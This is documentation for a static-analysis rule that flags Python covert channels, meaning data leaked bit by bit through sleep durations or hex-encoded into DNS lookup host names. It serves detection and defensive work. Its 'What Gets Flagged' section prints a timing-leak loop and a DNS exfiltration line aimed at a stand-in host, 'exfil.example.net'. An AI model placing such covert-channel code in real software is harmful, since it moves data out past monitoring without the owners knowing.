---
title: "VNX-514 – Covert Channel: data encoded in sleep timing or DNS lookups"
description: "Detects Python code that leaks data bit by bit through sleep durations, or encodes data (hex, base32, base64) into the host names of DNS lookups."
---

## Overview

VNX-514 maps to [CWE-514: Covert Channel](https://cwe.mitre.org/data/definitions/514.html). A covert channel moves data through a mechanism not meant to carry it, past controls that watch the intended channels. The rule reports two concrete Python shapes:

1. **Timing channel.** `time.sleep()`, `sleep()` or `asyncio.sleep()` whose duration depends on one bit of data: the loop variable of a loop over a binary representation (`format(x, '08b')`, `bin(x)`, an f-string `:08b`, or a variable assigned from one), or a shift-and-mask (`(v >> i) & 1`, `v & (1 << i)`) inline or assigned to a variable up to four lines above. A sleep call broken across lines is read with its two continuation lines. Hardware drivers (files importing `RPi.GPIO`, `gpiozero`, `machine`, `board` and similar) are skipped: bit-banged pulse widths are their intended protocol.
2. **DNS storage channel.** `socket.gethostbyname()`, `gethostbyname_ex()`, `getaddrinfo()` or `dns.resolver.resolve()`/`query()` (also on a `resolver` object) on a host name built (f-string, `%`, `+`, `.format`, `".".join(...)`) from hex, base32, base64 or hexlify-encoded data, inline or from a variable assigned such an encoding within 10 lines above.

**Severity:** Low | **CWE:** [CWE-514](https://cwe.mitre.org/data/definitions/514.html) | **Languages:** Python

## What Gets Flagged

```python
for bit in format(byte, "08b"):
    time.sleep(0.4 if bit == "1" else 0.1)                # FLAGGED
```

```python
chunk = data[i:i + 30].hex()
socket.gethostbyname(f"{chunk}.{i}.exfil.example.net")    # FLAGGED
```

## What Is Not Flagged

- Random jitter and exponential backoff (`time.sleep(2 ** attempt + random.uniform(0, 1))`).
- Sleeps that depend on ordinary values (a priority, a retry count).
- Lookups of fixed or service host names (`f"{service}.svc.cluster.local"`).
- The patterns in comments or string literals.

Covert channels in other media (packet timing, file metadata, other languages) are not detected.

## Remediation

1. Treat the finding as possible exfiltration: identify what data reaches the channel and who added the code.
2. Remove it; send legitimate telemetry over an authenticated, logged channel.
